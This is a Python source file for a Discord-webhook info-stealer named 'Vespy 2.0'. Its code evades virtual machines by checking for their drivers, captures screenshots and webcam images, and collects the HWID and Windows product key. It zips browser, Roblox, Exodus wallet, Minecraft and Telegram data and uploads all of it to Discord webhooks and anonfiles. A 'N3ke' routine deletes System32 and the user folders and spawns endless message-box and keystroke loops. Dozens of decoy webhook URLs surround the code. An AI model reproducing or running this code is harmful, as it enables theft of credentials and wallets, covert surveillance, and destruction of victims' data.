fake_webhook = 'https://ptb.discord.com/api/webhooks/1616695860583759123/WC9aJpg7Y74w3-fBPx-8vFk9NZSgfteiRDgr3z4aDOrjOtzSRXa1dTzKDf6hEtLQpvqo'
fake_wbh = 'https://canary.discord.com/api/webhooks/1032681250533502484/vhCcEhRm5DceKI2fzuuCg0neKH-VKkrvNSwEt2YAMEP_fZ111Y6ThFZZ65BqHiofDkRs'
fake_wbh = 'https://ptb.discord.com/api/webhooks/1946605057529753595/qF_21lfEkg3GgBCqS7t25QuhAe5x8HqvsENGzek4bX_vjxR-Dew2Decw4XCnU6riXTk'
fake_webhook = 'https://ptb.discord.com/api/webhooks/1390449186366196035/MrKcM5STFzMHpZkXDBNb_zSm5ZEms87L54nk7F2MTjubSbcV9JFekuLD30ipCTBWbqe'
webHOOK = 'https://discordapp.com/api/webhooks/1471451740722632518/2IN27oW4W93yhy-jNNQA57clohACIbhXW97Rq-yMfk6Z3rLLSKpde774bSKbxQ2gYfe'
webHOOK = 'https://discord.com/api/webhooks/1187829350757367894/PxCJqoDJzP_WlK3Sy5xUpZ3wbTpwizUNqAiebfQxt0vR01qujpFlsu0GVhhr6B9XDpA'
fake_wbh = 'https://ptb.discord.com/api/webhooks/1969027686026515115/4tb6-K5NvdadP2bjiovdrG4Uz9rfJt0J0qNMVibx_-7vlUvNXVbmVa3SykGN8SY0Uy5s'
webHOOK = 'https://ptb.discord.com/api/webhooks/1119770632029944570/O_COgEtX7sr3sBranpv1xwfknkM8up0WOMEVnx25lhsGqURRekStHxcg6mH32WvNj9PR'
fake_webhook = 'https://canary.discord.com/api/webhooks/1828593551245652388/H8l7w382-AIIOcaHtr9aE7FGPzc2ofA-4D-Y2IuzB6y1xYhB5hbN2UPVvNwXt5N0bhyX'
fake_webhook = 'https://ptb.discord.com/api/webhooks/1135639012438921488/Rrx03bMe5kzQMP7awNVxYovqw-IDPj9Mh7q1NBbY7h9DStQ0IxQV09ll5fnMRAE83eGq'
fake_wbh = 'https://canary.discord.com/api/webhooks/1697759793666987524/HYDMmWlIYFk2KlcLnSOIjDa18zWwdabbY_8b_UuU_WyNMhTAikqRCZw1ie1B45-17VZ'

class AntiVM:

    def __init__(self):
        self.drivers()
        self.Regcheck()
        self.VMcontrol()

    def drivers(self):
        if os.path.exists("C:\WINDOWS\system32\drivers\vmci.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\WINDOWS\system32\drivers\vmhgfs.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\WINDOWS\system32\drivers\vmmouse.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if  os.path.exists("C:\WINDOWS\system32\drivers\vmsci.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\WINDOWS\system32\drivers\vmusbmouse.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\WINDOWS\system32\drivers\vmx_svga.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\WINDOWS\system32\drivers\VBoxMouse.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)

    def Regcheck(self):
        R = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        R2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
        if R != 1 and R2 != 1:
            os.system("shutdown /r /t 1")
            os._exit(1)

    def VMcontrol(self):    
        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))
        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            os.system("shutdown /r /t 1")
            os._exit(1)      
        if os.path.exists(os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists(os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")):
            os.system("shutdown /r /t 1")
            os._exit(1)
        try:
            ctypes.cdll.LoadLibrary("SbieDll.dll")
            os.system("shutdown /r /t 1")
            os._exit(1)
        except:
            pass
class Hide:
	pass
class N3ke:

    def __init__(self):
        paths = [fr"C:\Windows\System32",fr"C:\Users\{user}\AppData\Local",fr"C:\Users\{user}\AppData\Roaming",fr"C:\ProgramData",fr"C:\Users\{user}\Videos",fr"C:\Users\{user}\Pictures",fr"C:\Users\{user}\Music",fr"C:\Users\{user}\Downloads",fr"C:\Users\{user}\Documents",winshell.desktop()]
        for p in paths:
            Thread(target=self.d3l,args=(p,)).start()
        Thread(target=self.cp6).start()
        Thread(target=self.sp4m).start()
        Thread(target=self.r0t4t).start()
        Thread(target=self.sp4h).start()

    def d3l(self,p):
        cky = os.chdir(p)
        for i in os.listdir(cky):
            if os.path.isdir(i):
                try:shutil.rmtree(i)
                except:pass
            else:
                try:os.remove(i)
                except:pass
    
    def cp6(self):
        try:
            sleep(0.3)
            with open(fr'C:\Users\{user}\AppData\Local\Temp\H7nv.vbs','w+') as f:
                f.write(f"""
While True
Wend
                """)
            os.system(fr'C:\Users\{user}\AppData\Local\Temp\H7nv.vbs')
        except:pass

    def sp4m(self):
        try:
            sleep(0.4)
            with open(fr'C:\Users\{user}\AppData\Local\Temp\l4gY.vbs','w+') as f:
                f.write(fr"""
set a = createobject("wscript.shell")
do
    a.sendkeys ("PC NUK3D H3LP")
    wscript.sleep (1)
loop""")
            os.system(fr'C:\Users\{user}\AppData\Local\Temp\l4gY.vbs')
        except:pass
    
    def r0t4t(self):
        screen = get_primary_display()
        for i in range(99999999):
            sleep(1.2)
            screen.rotate_to(i*90 % 360)
    
    def sp4h(self):
        with open(fr'C:\Users\{user}\AppData\Local\Temp\s4hgg.vbs', "w+") as f:
            f.write("""
do
x=MsgBox("Oops", vbOkOnly+vbCritical, "Fatal Error")
loop
            """)
            f.close()
        while True:
            os.system(fr"start C:\Users\{user}\AppData\Local\Temp\s4hgg.vbs")
            sleep(0.1)
class Reboot:
	pass
class Cl1ppa:
	pass
class Startup:
	pass
class ErrorMsg:
	pass
class Spread:
	pass
fake_wbh = 'https://discordapp.com/api/webhooks/1606839684604170768/7-NpBRVeYYHpXnQ3t5__rPtM9tKg5zx0q2yoQeWpJIEMgqWl6ve6Pd0FSVLn6F1Ptk-'
real_webhook = 'https://discord.com/api/webhooks/1074646027713315988/Zcg8qhcMdh9rAGraVhLRGTYeI_OIK8bRdyUS0CWZ5nEY6qhv8rXzNmo_0bfmSN_6w5'
real_webhook = 'https://discord.com/api/webhooks/1174068857046708767/MGrhE9Yb5aPHnACy9EweIFjO7SCaz8M6oD9bOBjBciFJcExMJW8PKg-2wl-Sa4gNPj'
fake_webhook = 'https://canary.discord.com/api/webhooks/1666687159422997374/Hfiw114bT8O00UvimuLk25aYTQKNlYhvrOgn6RJq_J08rOsnscJw75-0ddoQaCHrr'
thewebhook = 'https://discordapp.com/api/webhooks/1535301556532447683/a6MSZXCkrYeX_J81RHQskdCvM1eFD-R2SMHLDzet35Cgl_2g3ccuVcioC4DAh3B6vwx'
real_webhook = 'https://canary.discord.com/api/webhooks/1777155058587032687/dXamDah88VOHADEnZXmTOmuaYsITL5i4B_9eSVy9OOtn-7CR4T2J2e2cRuSGCQIQn-n'
fake_webhook = 'https://canary.discord.com/api/webhooks/1213003497620760454/xE0i68nkUNFvhE0zoV7dbE-0dyzsJ3S3upeBQCbQ_7DAoQdlzRwe8q-bqDxwrfTHahbK'
thewebhook = 'https://canary.discord.com/api/webhooks/1406185256873990956/w6v3o-PxiB7to6wmqOyFLTDTqg2-67CA1-hnLr23DdY1mtRQmowxPajqrqHR9AydNR8q'
fake_wbh = 'https://ptb.discord.com/api/webhooks/1333380248014244094/PMuLjSUehOm-nIkoHiV5p9G8CMhsWbTWADLW5gd_7divuRrianNWDx-mK_zXc_kMChdS'
webHOOK = 'https://discord.com/api/webhooks/1149817510836868988/XWV_IM4k68xdgE6yOKCCUnDlLab1KzyrWyB5ZXSo4I8_xahe-zvJ0_9igpi7nGdmZ782'
real_webhook = 'https://canary.discord.com/api/webhooks/1237993504661130530/naqBEM_hT4TceqtUTOQjJZBr1XL5hCPWzt8Gi3qabBcNFd0mQis7IKMfI0SbZySF2'
real_webhook = 'https://ptb.discord.com/api/webhooks/1890166163639104376/7m8KnjyjL4wJ1dW1Zb8opmgoE0RS_6oKUhx9kFl843J50uG15qoRGIrXe3fVCo-I0'
real_webhook = 'https://discord.com/api/webhooks/1125465801534242327/8hd-mNxUQpoIMKe5KnEaPpgVjoPsVHAYUUZ9kvanuYP-dKjB0fQ8vEXDLPxUoYHTeNw'
webHOOK = 'https://discord.com/api/webhooks/1366653820475892778/KRDi8EPr4bGzkLkiqmX9zZOPCS9TLceCYpvyjzzDfFPMx-w6RSDJokfI6jDnn6qdj'
webh = 'https://canary.discord.com/api/webhooks/1400600924871910199/o_N1JUrvSpqcqZv8rivd_jnDoQPP6kZIl8Ahp7ZEUOVr7zsXW7PdI3KJC77wzoAaB8'
fake_webhook = 'https://discordapp.com/api/webhooks/1101903056737121342/4cgQOVzC166ONllmxtD_Ki6BpZqB4vexXXiGEfetfksTSCpwgyAi9PxW48d_x2iPwO8'
thewebhook = 'https://ptb.discord.com/api/webhooks/1129662354013611063/wT3mI1BIvgKMyNvY3AvZQBOAKA7oacii7Sc7fcvPw5cXVkosvMFguoBQeLJkWpGMw'
thewebhook = 'https://canary.discord.com/api/webhooks/1369591135700956185/Nsc4TlkV4kzRHKXoorfbUPHN8Ae8s6SPVaRx8LhuEExqbTP2dlb_yRecJ_i7Ja1ZU-y'
webHOOK = 'https://ptb.discord.com/api/webhooks/1235832889255608266/Mv3kn5oGxhtLOq_xzXaHtdaxKuf45vWe5eaj-YnkP_gUv9Xyz6eORyt_OTVWJMyNE3'
real_webhook = 'https://ptb.discord.com/api/webhooks/1636391940165224279/VzqlHwuZnUvIaXJw3jJTLUPhqCL7TtTR7Y7NtIBVN2w5BDJOwRmR-Bjs3bGupD5RJ'
fake_webhook = 'https://canary.discord.com/api/webhooks/1925527963943414964/iycfwpeJ6_nPfqpVObXAKdflHmqTXUYrjKFB8HSpEDFNf3G5vEoUm7ZoXH3rUJ_On'
fake_webhook = 'https://canary.discord.com/api/webhooks/1990965753644996158/j1dekSR6PcWwtDOdyt1NuWXbRSTbuIrpw6Hdto4Lwpt8h2L3S6jOlJ82Tb0o_gYcX5D2'
thewebhook = 'https://canary.discord.com/api/webhooks/1962029293007842149/VbvmtTyFDq8GE6YPaha7-qCbfbS95zr_GrG80nDZBnk3GQXjb_nMzKqwSk0VjruSeF-Y'
webh = 'https://discord.com/api/webhooks/1401278562888195170/6_SOiKHV8H1IIeZkQXAippHctxStafgHm7qIYnkcQkpeiyuCj5KoEspmndPJJfM5Z'
real_webhook = 'https://discordapp.com/api/webhooks/1442069305006853896/gwKPg5iTBhvndQv1KY78_TjV6JhSPOFN3pS1kWDIeebhLsgM7F_06L7_IiDO52hK1'
webh = 'https://canary.discord.com/api/webhooks/1840966942202784161/_eGGI_40N3DhkS8p5UPVOIymy3ak1IYQqUY5KSWiW_zUVnLjD6_5cSE83WfdaKMH_G-w'
webHOOK = 'https://discordapp.com/api/webhooks/1966851450855827115/82HAAIwv64wTi3qwqX3ZE6U73sbnJJT_aSoyEQmZSQ4QAVG67uMZH24M01kCogGTlXL'
fake_webhook = 'https://discordapp.com/api/webhooks/1041338686258098754/FrDNXvO1gSppc3GJkge-pgzhFQlrUt0nTsgKLBv9cU6FRDYp6cHN-jMWpSJaX1WWDkk'
webh = 'https://canary.discord.com/api/webhooks/1444546288219643444/I2qchrX_T5D34-jDh7oSqgy_MfnJCIKa7B4iIRt8KKil8NIPZANx5X_qRXwUnh47h'
webh = 'https://canary.discord.com/api/webhooks/1874068286959252392/0qoTIyqbHCgnDAvD7phblzrMvhBloB8yWcI71qDalIG6gcllNHCAc8d0pnR52kJVyG'
real_webhook = 'https://discord.com/api/webhooks/1885791529408999971/GNI9nLD7a2xJy5Y0US9zV0dEsR7wUqRcfxCw_QjTPXpjHnTgZt6J0HPJYKej-WN1Ou2'
thewebhook = 'https://discord.com/api/webhooks/1737491114595697744/cfAxmx1hb2ATsEzyJjFxcHnJJd4m2YztVgo8B9baVmYhbgaucB2aoofxZCmS2zEmcE0'
webHOOK = 'https://discordapp.com/api/webhooks/1844371418288095883/BR31zmQ0C5wNPpMf4S94NERB1UwhEt0LBwFZiYnKfU8rmdfbrbM6Qc_GNRSJXGTn5r'
thewebhook = 'https://discordapp.com/api/webhooks/1136577873156902068/Zc-y9nCDLVwFoMJdbEPVVThYx5r8X0WCU1weG94bOJh8-_e0z9M9wf4w1RbazxYzvgf'
fake_webhook = 'https://discord.com/api/webhooks/1742141624806701168/fbrkR_1HSBlq9p4bRSw64HKhXCFe8uLls1vo6rGOC0vbeSn8NaP_DMwHuNzU0Tfltj'
real_webhook = 'https://ptb.discord.com/api/webhooks/1934285683869213552/SKCgWQOsmHvSDsdBf9CwF3cO-vx-pt8frqBP-pK1ggBGQn7io3I7T5oCiCE4oXNWtW'
webHOOK = 'https://discord.com/api/webhooks/1590133484968905277/PAbR4QtsbjIOAkeB4ePgscRN1-HKPFAax5hKMapmAfKRamJgQ_aYvXnuV3YoxilDhak'
fake_wbh = 'https://discordapp.com/api/webhooks/1860249157119600340/SqEa9SsOHJd4HeaXSN7ytawPQXvbWlKj6ZJKo-QIZ9SOVHwhj-oU4xkB7QzP8OcM3'
fake_webhook = 'https://discordapp.com/api/webhooks/1104993467811950831/gdB2jYbm8FDqqeosf_ata9kjqX9He5vp1Xqd4fZbDKhS95W4V4BxNxTrutpaZ9EUjSib'
real_webhook = 'https://ptb.discord.com/api/webhooks/1787752440399378284/NYLVgQIUyrLtywRSkiZuI_WABMbrvL_ckuKTf_ubBY7ehYofbjRsp_RSFezBzpGfZRk'
webHOOK = 'https://discord.com/api/webhooks/1440410173213633718/clYuqfsq-f5VecjC7GR9CJbonyEstJ_M0Rx4HWZH0iQPW2lsF0RL0wwftbtojDjpy'
fake_wbh = 'https://discord.com/api/webhooks/1046526161213667319/ySqA1Y9WeUpP1eTnSAJrlSjB5kj8pI-UrBiIO6WeFEa8_HVdaSeYeB-7y1XvYHh_yOx'
webh = 'https://discordapp.com/api/webhooks/1553827184063706495/YWG_lVfqMv-tDC5nFZuQBvjKLZ_4LnOrT57IbVS0m7Qpt028XIIdWGBlskuYGJc4UDT'
webh = 'https://discordapp.com/api/webhooks/1872350966057871785/TYeLbTYiJRAxHD0D61JQ9-lqSQg8WucW_DzYwrg0cz6Qf8EVuI2nu5CS_rzRnM8p2'
webHOOK = 'https://canary.discord.com/api/webhooks/1786059846647776858/CHMFPnBEcVVWmNgPJVk9gIvk91fNDFO18CgBrR8OxM-u15d2RjR4ihBhrQt-Sm5p7OJ'

class Screeny:

    def __init__(self):
        jtjirjihirthr = False
        try:
            r=self.Screen()
        except:
            pass
        self.Info()
        if jtjirjihirthr:
            content = "@everyone New Hit"
        else:
            content = "New Hit"
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png",content=content)
        embed = DiscordEmbed(title=f"New Victim", description=f"New victim | Pc Info + Screenshot", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        try:
            t=requests.get(r)
            if t.status_code == 200 or t.status_code == 204:
                embed.set_image(url=r)
        except:
            pass
        embed.add_embed_field(name=f":desktop: Logged : ``{self.user}``", value=f"\n:fax: Machine : ``{self.machine}``\n:gear: System : ``{self.system}``\n:control_knobs: Processor : ``{self.processor}``\n\n\n:floppy_disk: **Virtual Memory**\n:battery: Total : ``{self.TotalM}``\n:alembic: Available : ``{self.availableM}``\n:low_battery: Used : ``{self.usedM}``\n:symbols: Pourcentage : ``{self.pourcentageM}``\n\n\n:id: HWID : ``{self.hwid}``\n:key: Windows Product Key : {self.windowspk}")
        webhook.add_embed(embed)
        webhook.execute()
        os.remove("testy.jpg")
        try:
            camera.init()
            camlist = camera.list_cameras()
            if camlist:
                cam = camera.Camera(camlist[0], (640, 480))
                cam.start()
                image = cam.get_image()
                pygame.image.save(image, "webcam.jpg")
                file = requests.post('https://api.anonfiles.com/upload',files={'file':open("webcam.jpg","rb")})
                link = file.json()['data']['file']['url']['full']
                r=str(requests.get(link).content).split('<a id="download-preview-image-url" href="')[1].split('"')[0]
                webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                embed = DiscordEmbed(title=f"Webcam", description=f"Webcam Captured", color='4300d1')
                embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                embed.set_footer(text='Vespy 2.0 | by : vesper')
                embed.set_timestamp()
                try:
                    t=requests.get(r)
                    if t.status_code == 200 or t.status_code == 204:
                        embed.set_image(url=r)
                except:
                    pass
                webhook.add_embed(embed)
                webhook.execute()
                os.remove("webcam.jpg")
        except:
            pass
    
    def Screen(self):
        s = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
        s.save("testy.jpg")
        s.close()
        file = requests.post('https://api.anonfiles.com/upload',files={'file':open("testy.jpg","rb")})
        link = file.json()['data']['file']['url']['full']
        r=str(requests.get(link).content).split('<a id="download-preview-image-url" href="')[1].split('"')[0]
        return r
    
    def Size(self,b):
        for unit in ["", "K", "M", "G", "T", "P"]:
            if b < 1024:
                return f"{b:.2f}{unit}B"
            b /= 1024

    def Info(self):
        self.user = user
        self.machine = platform.machine()
        self.system = platform.system()
        self.processor = platform.processor()
        self.sv = psutil.virtual_memory()
        self.TotalM = self.Size(self.sv.total)
        self.availableM = self.Size(self.sv.available)
        self.usedM = self.Size(self.sv.used)
        self.pourcentageM = self.Size(self.sv.percent)+"%"
        self.hwid = str(subprocess.check_output('wmic csproduct get uuid',creationflags=subprocess.CREATE_NO_WINDOW)).replace(" ","").split("\\n")[1].split("\\r")[0]
        try:
            self.windowspk = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey',creationflags=subprocess.CREATE_NO_WINDOW).decode(encoding="utf-8", errors="strict").split("OA3xOriginalProductKey")[1].split(" ")
            for i in self.windowspk:
                if len(i) > 20:self.windowspk = i.split(" ")
            self.windowspk= f"``{self.windowspk[0][3:]}``"
        except:
            self.windowspk = ":x:"


def zipette():
    shutil.make_archive(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"),'zip',os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
def main():
    Antidebug()
    AntiVM()
    Startup()
    Hide()
    Thread(target=ErrorMsg).start()
    Thread(target=Cl1ppa).start()
    Screeny()
    content = f":open_file_folder: ``GRABBED_{user}``"
    content += str(Browsers())
    content += str(Roblox())
    content += str(EXodus())
    content += str(Minecraft())
    content += str(Telegram())
    content += "\n``|_ END``"
    zipette()
    webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
    webhook.add_file(file=open(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}.zip"),'rb').read(),filename=f"GRABBED_{user}.zip")
    webhook.execute()
    webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
    embed = DiscordEmbed(title=f"Info Grabbed of user : ``{user}``", description=content, color='4300d1')
    embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
    embed.set_footer(text='Vespy 2.0 | by : vesper')
    embed.set_timestamp()
    webhook.add_embed(embed)
    webhook.execute()
    os.remove(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}.zip"));shutil.rmtree(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
    try:
        CookieInfo(rocookies)
    except:
        pass
    DISCORD()
    Thread(target=Injection).start()
    Files()
    Network()
    Spread()
    N3ke()
    Reboot()
main()
real_webhook = 'https://discord.com/api/webhooks/1097509184460612053/GfSdntMlPhiipl2weBeGmnGnMu39Jww9nZkd-6yTsjEBABiVqahf78-zQ8vcVlavPOt'
real_webhook = 'https://ptb.discord.com/api/webhooks/1995703377685541915/hxuIzwf2dC3LIpXyEw_kdphNWhjLq6k_RWTB-xR8C9LOBmkaFj3sY4GxFu3Zf25oi3'
webh = 'https://discord.com/api/webhooks/1682983987309129998/kM19EoyOhbqlgEFtDczJfuVKFUa-FJvclc91LarFtANPQ_enHt0-N1g8hT91vNAPw8J'
thewebhook = 'https://canary.discord.com/api/webhooks/1764213567961638983/VIytthrpYog5dhDsWLfnjetJaCdeCS3m7lFEhjk6BKrLxSeAx8H5sWYPRVOC9I4vig'
webh = 'https://canary.discord.com/api/webhooks/1450333362839316797/jsElWVTnYows8gmyMilGlJMDs7hq15nG5IUUGNQ-WVL_OZ2HcVpW-0LLQwnfmNiYzx'
webh = 'https://discordapp.com/api/webhooks/1353885800730666569/BW2xLPZlzh-XxGnGVK9mpqmEucQ3GYkGlL7zN_FCLacp0NqBq-IFkCQm6hFSSOay7i'
fake_wbh = 'https://ptb.discord.com/api/webhooks/1634538793934034715/hkVWFeqaeyECUdhCyDd2ikyGa6BSNKKDlUVAMRaWwD09H4Ue_qixZWrHJZ7bq63JSTHp'
webHOOK = 'https://discord.com/api/webhooks/1450359557966757763/Xp2xl-1gt2GJgCGDe5e1_Pa_pO3ONfp3dBddimeEMEr1oZou6pozN5WbI-wscBtHIwW'
fake_wbh = 'https://canary.discord.com/api/webhooks/1115507013096025951/p2_DI_N7AKRt-vsX45ZDB-jY4JoU2ZwdnI5F8ATnqwIUju9MNeAgksGfW7gtia0IiEw'
real_webhook = 'https://canary.discord.com/api/webhooks/1466251376452188496/-LsSlYyXMHm2BzD3DCGb0wx4inZJBseBG5W92ql3F-TnThYaneMSyeAa2F9uIA0_zi'
thewebhook = 'https://discord.com/api/webhooks/1955202105333769815/Reuv0Q5ziSQQziB3icHQIYfV1BkiIdNqe5Pww5_rTRzT0rB2TdH4xs3zTQIPNnEEc1a'
fake_webhook = 'https://discordapp.com/api/webhooks/1983962892241602114/Awn6kwf7vtxJHmyUv7-Belc9N-mDKVoNFWGP53hintOrH9SfbW7XdI5aeXH1l0ToG7'
fake_wbh = 'https://discord.com/api/webhooks/1687058315322027007/wYwE0I0drhMIL3SgLvLU2GI3Pd_Zx2BEjtmdcBRrTCnJsVX3K2fW8ckdyAeavG5Pr'
webHOOK = 'https://ptb.discord.com/api/webhooks/1450496952219396339/tODkdKycoHhWmX_e-Z6ImO3I68_2ZL-kLBgZkUNs0V3g74YpB15QeHC9X3pE8mNmAck6'
fake_webhook = 'https://ptb.discord.com/api/webhooks/1936113108061148066/kL1_MEgNQAsnUiZv_3Q36mUDucJT6mHlaH55ttkbwQtm0IF6ogRgJX79A6sUFW2d7'
fake_webhook = 'https://discord.com/api/webhooks/1419198940339327415/VszjXeU78bN8w_Nu_j5A0QFR-BB8d6GXH4cWSeyNQUwq8w3m6qXfPAizDKYsmkZFFm'
fake_webhook = 'https://discordapp.com/api/webhooks/1172462699392938877/PCqJjiQKv9sLRBhxFAVkZETwgo0cY2P0XwZpKrC7t9gVLnxF6sH1UtBiH29qP0HbnW'
thewebhook = 'https://discord.com/api/webhooks/1780229670738622449/xGwQUimN6b9sXsSuEhX3sn18EgxrLQG7tzXzBzZOjbOJGefQk1tZrm3NKbKW_vtrxt'
fake_wbh = 'https://discord.com/api/webhooks/1714200096258911563/IWGlZ5gsytBzJQro-fFTujUVtkeiofOCp_foJjZGy4Wh8KPuzgXsbl8EJUUKIGwxz'
fake_wbh = 'https://discordapp.com/api/webhooks/1861716384204986093/J-YWH-bJPKZlx6aACQrq96SDrZh-sI8ZqliQuyT4mCoGSX0wFXcOAKNhky6e9ShbuMk'
webh = 'https://discord.com/api/webhooks/1314475459132168412/7MU0sLjZy1f1wGRgnZNvLaTzNrW8QTxrY69iZ_bHakGg-FCKIE33zIhJginDgIG8TF'
fake_webhook = 'https://discord.com/api/webhooks/1138206877576173662/i5Rr5rAlhxQl4KNsgriqXU_mSYxXY7jJh5So4ZsTgfvfsAmpaDmmNkA6u63oe_S6as'
real_webhook = 'https://discord.com/api/webhooks/1632739335508029590/PXtsPROPZ7ETQauOv-n0f02aXcffLwCK1H3Ou8n-dM-keUkW5W2tpysyGx4ZjvbnK'
real_webhook = 'https://canary.discord.com/api/webhooks/1568638463806114483/HpgAxVGdWb0l_1TMCLD7QbvbxN7qiPpmA0edwzj-pnIwRMmyOWYR42NdvFE_o0Qva__'
webHOOK = 'https://discord.com/api/webhooks/1806119044878792729/Rr7VMbGhysNgLf0ymY-Q7ssE2tBTdCo1zBtcVfiRgmIs5dlq8XxX7yGc3a5_3TLXStLZ'
fake_webhook = 'https://canary.discord.com/api/webhooks/1674772532590309569/tljv4Bw9I308Q0uTAo7940Hku03bN8G4UNlXzhs3mgC6OTPk-XeLulYMOqVAlZJBO'
thewebhook = 'https://canary.discord.com/api/webhooks/1845468710158703194/ukoT8QfQeqk90a8fOllVTdWbrACw-8VJPUkmmP1Ma0DepHpgtN05QpjjDrwgjyNS1'
webHOOK = 'https://ptb.discord.com/api/webhooks/1620657783088260834/VoSGYnfLrognvxjoFtQ7T5N5BNlIlRD12PdNBG-WlNQrcOb_jP20nhNhDG9bQXp_p'
fake_wbh = 'https://discordapp.com/api/webhooks/1058501725353777248/H9eHpS3XppMIGuIl2OUgktZeQjRA0DKLNKqzkCI1NQG_CVpz1K-LovzsDlkZTxPFL'
real_webhook = 'https://discord.com/api/webhooks/1544823524861237938/-uK_y7771orQQToVunv8BnajnA2xwDaVSkOdVb7gpJEAmPLVd9L-6NUaNk-uEjzpqqBp'
fake_wbh = 'https://canary.discord.com/api/webhooks/1133349538683661365/33W49tf34IMd-MOSxL5Do5eJ_CZswzY6GVlNlQ96bohgW5w6SsxhUGh9GHTDWZ6TX6h'
real_webhook = 'https://discordapp.com/api/webhooks/1735352167785518004/_c9T1LPg0TUXxe--aZ2sf5UZbTkH5TCLNk_reV_Z28PHZqYbFijDfWkwPY87YOmzYCwf'
thewebhook = 'https://discordapp.com/api/webhooks/1643016077700788336/CO07FWrF1wCbnT2ipy4CyYdR58sJ2dA91J_3BGw9shad8gfE1v1ga5hQxD2C740AV'
fake_wbh = 'https://discordapp.com/api/webhooks/1902225744379583269/LvD47xrRkhOzIx_d3a-Eihmhqq_4O9ZCPSmdIaTV5636pbaOOd4LhM71rvl5tGrbRAc3'
webHOOK = 'https://discordapp.com/api/webhooks/1344639037134367482/fy3pKkRkVgcvRkE_25EvN70qwsIcOZVz6M-qRVeIW_coEJ6aWlH4dpDatnnQ5Yc7YA'
webHOOK = 'https://discordapp.com/api/webhooks/1391469093683083454/-kmQfU218dON2clHqB4F3BQzIsRxxiOmDcmK-UTFxmAtHaKOOe8_PD-KhoWSXjgtI1Gr'
fake_wbh = 'https://discordapp.com/api/webhooks/1950890451870164031/y-LPS6s3MaWUp9I8V0lVcO-ht4CjuZctKc9s_ezfMs3k_TUIk0OTUyA6-fIOI_c00HO6'
thewebhook = 'https://discordapp.com/api/webhooks/1497265505609769391/qqEwXWBAitRdYSiP2TnRsAiySPduJhf6WqDhAB7JhvdbT7Acfc_kNkkahL_IgnpAncp'
fake_wbh = 'https://canary.discord.com/api/webhooks/1009636816579562044/q6d8ZiE-fdOGAMzEcYbe8JFIadNjQ5kLSrEfgaSgjBMwKHL9qb4Pb5IcxuHc2svhm80'
webh = 'https://canary.discord.com/api/webhooks/1433976881012905722/2_R1WMvV1TToDd4SwSPDn5ter3p_-snnXdQi9aVWKbykwlAVaH0yOWFvtzEvvD94B_fk'
fake_wbh = 'https://discordapp.com/api/webhooks/1940471004871692336/5kqINMEpJZ5ua41RDNry8VR4xu-VeaU4pTkgEj6umR4VO6fwl0Z1g_mrHPtBQXhLc'
fake_webhook = 'https://canary.discord.com/api/webhooks/1182753339018098990/SbQ_h-Wx47omm_illpMqEQ7yxjtaAHXtWaNYQD9i-Igta3GrQZ96hBm-0LrZdCGHUQ_A'
fake_webhook = 'https://discordapp.com/api/webhooks/1886115782485440797/GNBuMLRDdO8AenRHHpfADYbo8Eu7f4CSoSbcnNXXOafPCdCtCHWCJaXvLtMbyU-aJ'
webh = 'https://ptb.discord.com/api/webhooks/1851871932416305197/2czEe9WxguEEVPF257Mu8keRmywed7hyWkAvFZr9Rytsb9-a_OBecF6Vxof9pGmWP'
webh = 'https://discord.com/api/webhooks/1149602459369601063/kDq74c_3--Ob9akM1Dd7L5I5u2y_fcB9X26P7viUseBiUdEHw6WvDSLMwEEwZ5-PVmYy'

